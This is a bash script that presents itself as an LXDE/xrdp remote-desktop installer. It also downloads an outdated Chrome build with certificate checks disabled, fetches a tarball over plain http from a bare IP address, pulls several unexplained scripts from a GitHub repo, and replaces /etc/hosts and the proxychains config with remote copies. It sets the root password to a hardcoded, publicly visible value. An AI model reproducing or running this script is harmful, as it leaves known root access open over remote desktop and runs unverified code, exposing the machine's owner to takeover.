echo Updating and upgrading your System..
sleep 1
apt-get update
sleep 2
echo Installing desktop #(xrdp)
sleep 3
apt-get install xorg xrdp lxde -y
sleep 1
apt-get install zip -y
apt install unzip -y
apt-get install nano -y
sleep 5
sudo apt-get install tightvncserver -y
sleep 2
echo Removing Screensaver
apt-get remove xscreensaver -y
sleep 1
echo install chrome
sleep 1
wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
sudo apt-get update -y
sudo apt-get install google-chrome-stable -y
wget --no-check-certificate 'https://www.googleapis.com/drive/v3/files/1h7JJqMLu1IOGNF7OBkvt65a64C9XOhYc?alt=media&key=AIzaSyDTN35uWgTNDGpBi9iFpBf1WItEZZlr6aw' -O chrome60.deb
sudo apt purge google-chrome-stable -y
sleep 1
sudo dpkg -i chrome60.deb
sleep 1
sudo apt-get -f install -y
cd /home
wget http://68.69.187.118/chrome60new.tar.gz
tar -xvf chrome60new.tar.gz
sleep 1
cd Desktop
wget https://github.com/mazbron/x/raw/master/fmb/chr.sh
chmod +x chr.sh
wget https://github.com/mazbron/x/raw/master/fmb/AtoZ/clear.sh
chmod +x clear.sh
echo ==GD 2022==
wget https://github.com/mazbron/x/raw/master/GD/new22/GDNew.sh
wget https://github.com/mazbron/x/raw/master/GD/new22/FI.ascr
wget https://github.com/mazbron/x/raw/master/GD/new22/play.png
chmod +x GDNew.sh
chmod +x FI.ascr
chmod +x play.png
sudo service xrdp restart
apt-get install sl -y
cd /etc
mv hosts hosts.bak
mv proxychains.conf proxychains.conf.bak
wget https://github.com/mazbron/x/raw/master/fmb/proxychains.conf
wget https://github.com/mazbron/x/raw/master/fmb/hosts
echo "root:gl0d4kgl0d4k" | sudo chpasswd
sudo service xrdp restart
nano /etc/hosts

echo You have successfully Installed LXDE Desktop Environment.. Enjoy..!!
echo Ceeeers... MAZBRON.net
echo updated GD 2022
